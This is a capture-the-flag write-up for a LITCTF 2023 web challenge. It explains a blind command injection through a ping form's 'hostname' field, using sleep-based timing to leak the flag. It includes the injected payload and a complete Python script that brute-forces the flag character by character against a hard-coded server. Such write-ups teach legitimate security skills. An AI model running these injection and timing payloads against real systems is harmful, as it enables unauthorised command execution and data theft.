# LITCTF 23

LITCTF 23 code + writeup

so basically
for ping pong undermaintance
if u look at the source code
u realize that the function to excute a command is also called
this means we can still use command injection
however looking at how the page is rendered
we see that no output from the excuted command will be printed
this means we must use some other way to get information
at first i thought that i could modify the html to add the flag into the bottom
this way
the flag would render at the bottom of the screen
however i believe some commands are blocked such as rm as it would ruin the infrastructure

after a lot of thinking and testing
i found that the sleep command works
and causes the page longer to load results
this means that a timing attck is possible

so we must find a way to set different times for testing if a string is in the flag or not
we can use the payload

```bash
grep LITCTF{text flag.txt || sleep $?
```

using this commmand we also avoid using url encoded character which would not work in our command

testing this command out we can see that a proper prefix such as LITCTF causes the website to load almost instantly
however if we dont use a substring such at adsklfjhlkasjdfhkl it would cause the website to take over a second to load

now that we have this command 

we can test the prefix one character at a time

setting up a python program we can send post request to the website testing the prefixes
finding which character takes the least amount of time
appending that to the known prefix and then testing the next character
we end this once we get the closing brace

and here is the python script to send injections 

```py
import requests
import string

charlist = string.ascii_lowercase+string.digits+"_}"
print(charlist)


text = "LITCTF{"

url = 'http://34.130.180.82:59880/'

headers = {
    'Host': url,
    # 'Content-Length': '11',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': url,
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': url,
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close',
}

data = {
    'hostname': 'hi',
}



while True:
    ti = dict();
    for x in charlist:
        ti[x] = 0

    for x in charlist:
        teststr = text+x
        injection = f";grep -q {teststr} flag.txt || sleep $(($?*1))"
        data = {'hostname': injection}
        req = requests.post(url, headers=headers, data=data)
        print(teststr,req.elapsed.total_seconds())
        ti[x] = req.elapsed.total_seconds()
    
    bestchr = ""
    besttime = 1000
    for x in charlist:
        if(ti[x] < besttime):
            besttime = ti[x]
            bestchr = x
    text+=bestchr
    print(text)
    if(bestchr == '}'): break

```

after a while of using this program
I was able to retrieve the flag

```txt
LITCTF{c4refu1_fr}
```